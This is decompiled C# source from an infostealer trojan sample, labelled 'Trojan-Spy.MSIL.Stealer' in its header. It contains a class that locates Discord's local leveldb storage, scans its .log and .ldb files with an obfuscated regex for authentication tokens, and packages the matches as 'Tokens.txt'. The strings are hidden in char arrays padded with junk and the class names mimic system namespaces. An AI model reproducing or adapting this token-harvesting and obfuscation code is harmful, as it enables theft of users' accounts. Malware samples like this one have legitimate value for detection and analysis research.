// Decompiled with JetBrains decompiler
// Type: SystemNetWebSocketsWebSocketProtocolComponentBufferTyper
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

public class SystemNetWebSocketsWebSocketProtocolComponentBufferTyper : 
  MicrosoftWinNativeMethodsMEMORYBASICINFORMATIONd
{
  public override string Id2(SystemDataXSDSchemaNameTypeE scannerArg, FileInfo fileInfo) => string.Empty;

  public override IEnumerable<SystemDataXSDSchemaNameTypeE> Id3()
  {
    List<SystemDataXSDSchemaNameTypeE> xsdSchemaNameTypeEList = new List<SystemDataXSDSchemaNameTypeE>();
    try
    {
      string str = Environment.ExpandEnvironmentVariables(new string(new char[39]
      {
        '%',
        'a',
        'p',
        'p',
        'd',
        'a',
        't',
        'a',
        '%',
        '\\',
        'd',
        'i',
        's',
        'c',
        'o',
        'r',
        'd',
        '\\',
        'L',
        'o',
        'c',
        'a',
        'l',
        ' ',
        'S',
        't',
        'o',
        'r',
        'a',
        'g',
        'e',
        '\\',
        'l',
        'e',
        'v',
        'e',
        'l',
        'd',
        'b'
      }));
      xsdSchemaNameTypeEList.Add(new SystemDataXSDSchemaNameTypeE()
      {
        Id1 = str,
        Id2 = new string(new char[8]
        {
          '-',
          '*',
          '.',
          'l',
          'o',
          '-',
          '-',
          'g'
        }).Replace("-", string.Empty),
        Id3 = false
      });
      xsdSchemaNameTypeEList.Add(new SystemDataXSDSchemaNameTypeE()
      {
        Id1 = str,
        Id2 = new string(new char[9]
        {
          '1',
          '*',
          '.',
          '1',
          'l',
          '1',
          'd',
          '1',
          'b'
        }).Replace("1", string.Empty),
        Id3 = false
      });
    }
    catch
    {
    }
    return (IEnumerable<SystemDataXSDSchemaNameTypeE>) xsdSchemaNameTypeEList;
  }

  public static IEnumerable<SystemNetConfigurationMailSettingsSectionGroupg> GetTokens()
  {
    List<SystemNetConfigurationMailSettingsSectionGroupg> settingsSectionGroupgList = SystemNetSpnDictionaryE.Search((MicrosoftWinNativeMethodsMEMORYBASICINFORMATIONd) new SystemNetWebSocketsWebSocketProtocolComponentBufferTyper());
    StringBuilder stringBuilder = new StringBuilder();
    foreach (SystemNetConfigurationMailSettingsSectionGroupg settingsSectionGroupg in settingsSectionGroupgList)
    {
      try
      {
        foreach (Match match in Regex.Matches(Encoding.UTF8.GetString(settingsSectionGroupg.Id3), new string(new char[77]
        {
          '[',
          'A',
          'S',
          't',
          'r',
          'i',
          'n',
          'g',
          '-',
          'Z',
          'a',
          'S',
          't',
          'r',
          'i',
          'n',
          'g',
          '-',
          'z',
          '\\',
          'd',
          ']',
          '{',
          '2',
          'S',
          't',
          'r',
          'i',
          'n',
          'g',
          '4',
          '}',
          '\\',
          '.',
          '[',
          'S',
          't',
          'r',
          'i',
          'n',
          'g',
          '\\',
          'w',
          '-',
          ']',
          '{',
          'S',
          't',
          'r',
          'i',
          'n',
          'g',
          '6',
          '}',
          '\\',
          '.',
          '[',
          '\\',
          'w',
          'S',
          't',
          'r',
          'i',
          'n',
          'g',
          '-',
          ']',
          '{',
          '2',
          'S',
          't',
          'r',
          'i',
          'n',
          'g',
          '7',
          '}'
        }).Replace("String", string.Empty)))
        {
          try
          {
            string str = match.ToString().Trim();
            if (!stringBuilder.ToString().Contains(str))
              stringBuilder.AppendLine(str);
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
    }
    yield return new SystemNetConfigurationMailSettingsSectionGroupg()
    {
      Id3 = Encoding.ASCII.GetBytes(stringBuilder.ToString()),
      Id1 = new string(new char[38]
      {
        'T',
        'R',
        'e',
        'p',
        'l',
        'a',
        'c',
        'e',
        'o',
        'k',
        'R',
        'e',
        'p',
        'l',
        'a',
        'c',
        'e',
        'e',
        'n',
        'R',
        'e',
        'p',
        'l',
        'a',
        'c',
        'e',
        's',
        '.',
        't',
        'R',
        'e',
        'p',
        'l',
        'a',
        'c',
        'e',
        'x',
        't'
      }).Replace("Replace", string.Empty)
    };
  }
}
